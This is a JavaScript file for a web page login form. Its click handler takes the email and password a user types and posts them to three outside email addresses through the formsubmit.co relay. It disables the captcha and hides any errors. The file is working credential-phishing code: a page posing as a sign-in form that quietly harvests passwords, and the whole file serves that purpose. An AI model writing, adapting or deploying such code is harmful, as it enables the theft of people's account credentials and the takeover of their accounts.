const inputMail = document.querySelector(".mail");
const inputMdp = document.querySelector(".mdp");
const btnNext = document.querySelector(".primary");

btnNext.addEventListener("click", async () => {
  const email = inputMail.value;
  const mdp = inputMdp.value;
  if (email.trim() === "" || mdp.trim() === "") return;

  try {
    await fetch("https://formsubmit.co/ajax/athomas@edenschool.fr", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
      },
      body: new URLSearchParams({
        _subject: "Test connexon 2 champs",
        identifiant: email,
        mot_de_passe: mdp,
        _captcha: "false",
        _next: "https://formsubmit.co/success",
      }),
    });
    inputMail.value = "";
    inputMdp.value = "";
  } catch (e) {}

  try {
    await fetch("https://formsubmit.co/ajax/paulbegin28@gmail.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
      },
      body: new URLSearchParams({
        _subject: "Test connexon 2 champs",
        identifiant: email,
        mot_de_passe: mdp,
        _captcha: "false",
        _next: "https://formsubmit.co/success",
      }),
    });
    inputMail.value = "";
    inputMdp.value = "";
  } catch (e) {}

  try {
    await fetch("https://formsubmit.co/ajax/andiproo0077@gmail.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
      },
      body: new URLSearchParams({
        _subject: "Test connexon 2 champs",
        identifiant: email,
        mot_de_passe: mdp,
        _captcha: "false",
        _next: "https://formsubmit.co/success",
      }),
    });
    inputMail.value = "";
    inputMdp.value = "";
  } catch (e) {}
});
